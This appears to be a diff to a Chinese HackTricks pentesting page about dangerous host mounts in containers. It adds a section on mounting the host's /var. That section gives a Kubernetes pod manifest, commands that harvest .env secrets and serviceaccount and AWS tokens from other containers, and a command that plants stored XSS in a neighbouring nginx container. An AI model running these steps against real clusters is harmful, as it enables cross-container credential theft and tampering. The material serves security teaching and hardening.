@@ -2,7 +2,7 @@
 
 {{#include ../../../../banners/hacktricks-training.md}}
 
-暴露 `/proc` 和 `/sys` 而没有适当的命名空间隔离会引入重大安全风险，包括攻击面扩大和信息泄露。这些目录包含敏感文件，如果配置错误或被未经授权的用户访问，可能导致容器逃逸、主机修改或提供有助于进一步攻击的信息。例如，错误地挂载 `-v /proc:/host/proc` 可能会由于其基于路径的特性绕过 AppArmor 保护，使得 `/host/proc` 没有保护。
+暴露 `/proc`、`/sys` 和 `/var` 而没有适当的命名空间隔离会引入重大安全风险，包括攻击面扩大和信息泄露。这些目录包含敏感文件，如果配置错误或被未经授权的用户访问，可能导致容器逃逸、主机修改或提供有助于进一步攻击的信息。例如，错误地挂载 `-v /proc:/host/proc` 可能会由于其基于路径的特性绕过 AppArmor 保护，使得 `/host/proc` 没有保护。
 
 **您可以在** [**https://0xn3va.gitbook.io/cheat-sheets/container/escaping/sensitive-mounts**](https://0xn3va.gitbook.io/cheat-sheets/container/escaping/sensitive-mounts)** 中找到每个潜在漏洞的更多详细信息。**
 
@@ -53,7 +53,7 @@ ls -l $(cat /proc/sys/kernel/modprobe) # 检查对 modprobe 的访问
 - [Poor man's rootkit via binfmt_misc](https://github.com/toffan/binfmt_misc)
 - 深入教程：[视频链接](https://www.youtube.com/watch?v=WBC7hhgMvQQ)
 
-### 其他 `/proc` 中的内容
+### `/proc` 中的其他内容
 
 #### **`/proc/config.gz`**
 
@@ -72,7 +72,7 @@ echo b > /proc/sysrq-trigger # 重启主机
 #### **`/proc/kmsg`**
 
 - 暴露内核环形缓冲区消息。
-- 可以帮助进行内核利用、地址泄露，并提供敏感系统信息。
+- 可以帮助内核利用、地址泄露，并提供敏感系统信息。
 
 #### **`/proc/kallsyms`**
 
@@ -90,7 +90,7 @@ echo b > /proc/sysrq-trigger # 重启主机
 #### **`/proc/kcore`**
 
 - 以 ELF 核心格式表示系统的物理内存。
-- 读取可能会泄露主机系统和其他容器的内存内容。
+- 读取可能泄露主机系统和其他容器的内存内容。
 - 大文件大小可能导致读取问题或软件崩溃。
 - 详细用法见 [Dumping /proc/kcore in 2019](https://schlafwandler.github.io/posts/dumping-/proc/kcore/)。
 
@@ -157,18 +157,106 @@ cat /output %%%
 
 #### **`/sys/firmware/efi/vars` 和 `/sys/firmware/efi/efivars`**
 
-- 暴露与 NVRAM 中的 EFI 变量交互的接口。
+- 暴露与 NVRAM 中 EFI 变量交互的接口。
 - 配置错误或利用可能导致笔记本电脑砖化或主机无法启动。
 
 #### **`/sys/kernel/debug`**
 
-- `debugfs` 提供了一个“无规则”的调试接口给内核。
+- `debugfs` 提供了一个“无规则”的内核调试接口。
 - 由于其不受限制的特性，历史上存在安全问题。
+
+### `/var` 漏洞
+
+主机的 **/var** 文件夹包含容器运行时套接字和容器的文件系统。如果该文件夹在容器内挂载，该容器将获得对其他容器文件系统的读写访问权限，具有 root 权限。这可能被滥用以在容器之间进行跳转，导致拒绝服务，或为在其中运行的其他容器和应用程序后门。
+
+#### Kubernetes
+
+如果像这样的容器通过 Kubernetes 部署：
+```yaml
+apiVersion: v1
+kind: Pod
+metadata:
+name: pod-mounts-var
+labels:
+app: pentest
+spec:
+containers:
+- name: pod-mounts-var-folder
+image: alpine
+volumeMounts:
+- mountPath: /host-var
+name: noderoot
+command: [ "/bin/sh", "-c", "--" ]
+args: [ "while true; do sleep 30; done;" ]
+volumes:
+- name: noderoot
+hostPath:
+path: /var
+```
+在 **pod-mounts-var-folder** 容器内：
+```bash
+/ # find /host-var/ -type f -iname '*.env*' 2>/dev/null
+
+/host-var/lib/containerd/io.containerd.snapshotter.v1.overlayfs/snapshots/201/fs/usr/src/app/.env.example
+<SNIP>
+/host-var/lib/containerd/io.containerd.snapshotter.v1.overlayfs/snapshots/135/fs/docker-entrypoint.d/15-local-resolvers.envsh
+
+/ # cat /host-var/lib/containerd/io.containerd.snapshotter.v1.overlayfs/snapshots/105/fs/usr/src/app/.env.example | grep -i secret
+JWT_SECRET=85d<SNIP>a0
+REFRESH_TOKEN_SECRET=14<SNIP>ea
+
+/ # find /host-var/ -type f -iname 'index.html' 2>/dev/null
+/host-var/lib/containerd/io.containerd.snapshotter.v1.overlayfs/snapshots/57/fs/usr/src/app/node_modules/@mapbox/node-pre-gyp/lib/util/nw-pre-gyp/index.html
+<SNIP>
+/host-var/lib/containerd/io.containerd.snapshotter.v1.overlayfs/snapshots/140/fs/usr/share/nginx/html/index.html
+/host-var/lib/containerd/io.containerd.snapshotter.v1.overlayfs/snapshots/132/fs/usr/share/nginx/html/index.html
+
+/ # echo '<!DOCTYPE html><html lang="en"><head><script>alert("Stored XSS!")</script></head></html>' > /host-var/lib/containerd/io.containerd.snapshotter.v1.overlayfs/snapshots/140/fs/usr/sh
+are/nginx/html/index2.html
+```
+XSS 是通过以下方式实现的：
+
+![通过挂载的 /var 文件夹存储的 XSS](/images/stored-xss-via-mounted-var-folder.png)
+
+请注意，容器不需要重启或其他操作。通过挂载的 **/var** 文件夹所做的任何更改将立即生效。
+
+您还可以替换配置文件、二进制文件、服务、应用程序文件和 shell 配置文件，以实现自动（或半自动）RCE。
+
+##### 访问云凭证
+
+容器可以读取 K8s serviceaccount 令牌或 AWS webidentity 令牌，这使得容器能够获得对 K8s 或云的未经授权访问：
+```bash
+/ # cat /host-var/run/secrets/kubernetes.io/serviceaccount/token
+/ # cat /host-var/run/secrets/eks.amazonaws.com/serviceaccount/token
+```
+#### Docker
+
+在Docker（或Docker Compose部署）中的利用方式完全相同，唯一的区别是其他容器的文件系统通常在不同的基础路径下可用：
+```bash
+$ docker info | grep -i 'docker root\|storage driver'
+Storage Driver: overlay2
+Docker Root Dir: /var/lib/docker
+```
+所以文件系统位于 `/var/lib/docker/overlay2/`：
+```bash
+$ sudo ls -la /var/lib/docker/overlay2
+
+drwx--x---  4 root root  4096 Jan  9 22:14 00762bca8ea040b1bb28b61baed5704e013ab23a196f5fe4758dafb79dfafd5d
+drwx--x---  4 root root  4096 Jan 11 17:00 03cdf4db9a6cc9f187cca6e98cd877d581f16b62d073010571e752c305719496
+drwx--x---  4 root root  4096 Jan  9 21:23 049e02afb3f8dec80cb229719d9484aead269ae05afe81ee5880ccde2426ef4f
+drwx--x---  4 root root  4096 Jan  9 21:22 062f14e5adbedce75cea699828e22657c8044cd22b68ff1bb152f1a3c8a377f2
+<SNIP>
+```
+#### 注意
+
+实际路径在不同的设置中可能会有所不同，这就是为什么你最好的选择是使用 **find** 命令来定位其他容器的文件系统
+
+
 
 ### 参考文献
 
 - [https://0xn3va.gitbook.io/cheat-sheets/container/escaping/sensitive-mounts](https://0xn3va.gitbook.io/cheat-sheets/container/escaping/sensitive-mounts)
-- [理解和强化 Linux 容器](https://research.nccgroup.com/wp-content/uploads/2020/07/ncc_group_understanding_hardening_linux_containers-1-1.pdf)
-- [滥用特权和非特权 Linux 容器](https://www.nccgroup.com/globalassets/our-research/us/whitepapers/2016/june/container_whitepaper.pdf)
+- [Understanding and Hardening Linux Containers](https://research.nccgroup.com/wp-content/uploads/2020/07/ncc_group_understanding_hardening_linux_containers-1-1.pdf)
+- [Abusing Privileged and Unprivileged Linux Containers](https://www.nccgroup.com/globalassets/our-research/us/whitepapers/2016/june/container_whitepaper.pdf)
 
 {{#include ../../../../banners/hacktricks-training.md}}
